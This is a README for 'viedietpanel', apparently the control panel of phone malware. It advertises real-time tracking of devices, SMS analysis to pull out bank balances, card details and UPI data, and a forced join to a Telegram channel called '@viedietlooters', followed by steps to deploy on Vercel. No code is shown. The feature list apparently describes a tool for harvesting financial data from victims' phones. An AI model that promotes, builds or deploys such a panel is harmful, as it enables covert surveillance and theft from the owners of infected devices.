# viedietpanel

**Premium Device Management & Monitoring Console**
Real-time monitoring, SMS Analysis, Bank & Card Tracking

[![Deploy to Vercel](https://vercel.com/button)](https://vercel.com/new?project=viedietpanel)

## Features

- Real-time device tracking (Online / Offline)
- Battery & Signal Strength
- SMS Analysis (Bank balances, Cards, UPI)
- Starred devices for quick access
- 3D Animated Background with mouse interaction
- Premium Dark UI
- Firebase-based device management
- Auto-refresh every 15 seconds
- Force-join gate: users must join [@viedietlooters](https://t.me/viedietlooters) to unlock access

## Quick Start (Deploy on Vercel)

1. **Create folder** and name it `viedietpanel`
2. Create these files:
   - `index.html`
   - `package.json`
   - `vercel.json`
   - `README.md` (this file)
3. Open [https://vercel.com](https://vercel.com) and click **+ New Project**
4. Drag & drop your folder
5. Click **Deploy**
